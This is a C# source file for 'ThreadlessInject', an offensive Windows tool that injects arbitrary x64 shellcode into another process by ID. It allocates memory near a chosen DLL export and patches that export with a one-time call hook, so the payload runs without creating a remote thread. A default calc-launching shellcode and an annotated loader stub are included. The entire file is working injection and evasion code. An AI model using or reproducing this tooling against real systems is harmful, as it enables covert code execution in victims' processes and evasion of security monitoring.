using Mono.Options;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;
using System.Diagnostics;
using System.Threading;

namespace ThreadlessInject {
    class Program {

        [Flags]
        enum ProcessAccessFlags : uint {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum AllocationType {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObj);
        
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress,int dwSize, AllocationType dwFreeType);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, out long bytes, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        //x64 calc shellcode function with ret as default if no shellcode supplied
        static byte[] x64 = {  0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
                            0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
                            0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
                            0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
                            0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
                            0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
                            0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
                            0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
                            0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3};

        static byte[] shellcodeLoader = new byte[] { 0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0, 0x90 };


        static byte[] GenerateHook(long startAddress, long originalInstructions) {

            // This function generates the following shellcode.
            // The hooked function export is determined by immdetietly popping the return address and substracting by 5 (size of relative call instruction)
            // Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
            // The hooked function bytes are restored to the original values (essentially a one time hook)
            // A relative function call is made to the injected shellcode that will follow immediately after the stub
            // Original function arguments are popped off the stack and restored to the correct registers
            // A jmp back to the original unpatched export restoring program behavior as normal
            // 
            // This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
            // the injector can then monitor for when the restoration has occured to restore the memory back to RX


            /*
              start:
                0:  58                      pop    rax
                1:  48 83 e8 05             sub    rax,0x5
                5:  50                      push   rax
                6:  51                      push   rcx
                7:  52                      push   rdx
                8:  41 50                   push   r8
                a:  41 51                   push   r9
                c:  41 52                   push   r10
                e:  41 53                   push   r11
                10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
                17: 33 22 11
                1a: 48 89 08                mov    QWORD PTR [rax],rcx
                1d: 48 83 ec 40             sub    rsp,0x40
                21: e8 11 00 00 00          call   shellcode
                26: 48 83 c4 40             add    rsp,0x40
                2a: 41 5b                   pop    r11
                2c: 41 5a                   pop    r10
                2e: 41 59                   pop    r9
                30: 41 58                   pop    r8
                32: 5a                      pop    rdx
                33: 59                      pop    rcx
                34: 58                      pop    rax
                35: ff e0                   jmp    rax
              shellcode:
            */

            using (var writer = new BinaryWriter(new MemoryStream(shellcodeLoader))) {
                //Write the original 8 bytes that were in the orignal export prior to hooking
                writer.Seek(0x12, SeekOrigin.Begin);
                writer.Write(originalInstructions);
                writer.Flush();
            }

            return shellcodeLoader;
        }

        static ulong FindMemoryHole(IntPtr processHandle, ulong exportAddress, int size) {

            ulong remoteLoaderAddress = 0;
            bool foundMemory = false;

            for (remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress + 0x70000000; remoteLoaderAddress += 0x10000) {
                if (VirtualAllocEx(processHandle, (IntPtr)remoteLoaderAddress, (IntPtr)size, 0x3000 , 0x20) != IntPtr.Zero) {
                    foundMemory = true;
                    break;
                }
            }

            if (foundMemory)
                return remoteLoaderAddress;
            else
                return 0;

        }

        static byte[] ReadPayload(string payloadArg) {
            if (File.Exists(payloadArg)) {
                return File.ReadAllBytes(payloadArg);
            } else {
                Console.WriteLine($"[=] Shellcode argument doesn't appear to be a file, assuming Base64");
                return Convert.FromBase64String(payloadArg);
            }
        }

        static byte[] LoadShellcode(string shellcodeArg) {

            byte[] shellcode = null;

            if (shellcodeArg == null) {
                Console.WriteLine("[=] No shellcode supplied, using calc shellcode");
                    shellcode = x64;
            } else {
                shellcode = ReadPayload(shellcodeArg);
            }

            return shellcode;
        }

        static void Main(string[] args) {

            bool showHelp = false;
            string shellcodeStr = null;
            string dll = null;
            string export = null; 
            int pid = 0;

            OptionSet option_set = new OptionSet()
                .Add("h|help", "Display this help", v => showHelp = v != null)
                .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)", v => shellcodeStr = v)
                .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
                .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
                .Add("e=|export=", "The exported function that will be hijacked", v => export = v);

            try {

                option_set.Parse(args);

                if(dll == null || pid == 0 || export == null) {
                    Console.WriteLine("[!] pid, dll and export arguments are required");
                    showHelp = true;
                }

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine($"[!] Failed to parse arguments: {e.Message}");
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            IntPtr hDLL = GetModuleHandle(dll);

            if(hDLL == IntPtr.Zero) {
                hDLL = LoadLibrary(dll);
            }

            if(hDLL == IntPtr.Zero) {
                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
                return;
            }

            IntPtr exportAddress = GetProcAddress(hDLL, export);

            if(exportAddress == IntPtr.Zero) {
                Console.WriteLine($"[!] Failed to find export {export} in {dll}, are you sure it's correct?");
                return;
            }

            Console.WriteLine($"[=] Found {dll}!{export} @ 0x{exportAddress.ToInt64():x}");

            IntPtr processHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite | ProcessAccessFlags.VirtualMemoryOperation, false, (uint)pid);

            if(processHandle == IntPtr.Zero) {
                Console.WriteLine($"[!] Failed to open process with ID {pid}, error 0x{Marshal.GetLastWin32Error():x}");
                return;            
            }

            Console.WriteLine($"[=] Opened process with id {pid}");

            var shellcode = LoadShellcode(shellcodeStr);
            var loaderAddress = FindMemoryHole(processHandle, (ulong)exportAddress, shellcodeLoader.Length + shellcode.Length);


            if(loaderAddress == 0) {
                Console.WriteLine("[!] Failed to find a memory hole with 2G of export address, bailing");
                return;
            }

            Console.WriteLine($"[=] Allocated loader and shellcode at 0x{loaderAddress:x} within process {pid}");

            var originalBytes = Marshal.ReadInt64(exportAddress);
            var loader = GenerateHook((long)loaderAddress, originalBytes);

            VirtualProtectEx(processHandle, exportAddress, (UIntPtr)8, 0x40, out uint oldProtect);

            int relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
            byte[] callOpCode = new byte[]{ 0xe8, 0, 0, 0, 0};

            using (var writer = new BinaryWriter(new MemoryStream(callOpCode))) {
                writer.Seek(1, SeekOrigin.Begin);
                writer.Write(relativeLoaderAddress);
            }

            var payload = shellcodeLoader.Concat(shellcode).ToArray();

            WriteProcessMemory(processHandle, exportAddress, callOpCode, callOpCode.Length, out IntPtr written);
            WriteProcessMemory(processHandle, (IntPtr)loaderAddress, payload, payload.Length, out written);


            var timer = new Stopwatch();
            timer.Start();
            bool executed = false;

            Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");


            while(timer.Elapsed.TotalSeconds < 60) {

                ReadProcessMemory(processHandle, exportAddress, out long currentBytes, 8, out IntPtr bytesRead);

                if(originalBytes == currentBytes) {                  
                    executed = true;
                    break;
                }

                Thread.Sleep(1000);
            }

            timer.Stop();

            if (executed) {
                VirtualProtectEx(processHandle, exportAddress, (UIntPtr)8, oldProtect, out oldProtect);
                VirtualFreeEx(processHandle, (IntPtr)loaderAddress, 0, AllocationType.Release);
                Console.WriteLine($"[+] Shellcode executed after {timer.Elapsed.TotalSeconds}s, export restored");                
            } else {
                Console.WriteLine("[!] Shellcode did not trigger within 60s, it may still execute but we are not cleaing up");
            }
            
            CloseHandle(processHandle);
        }
    }
}
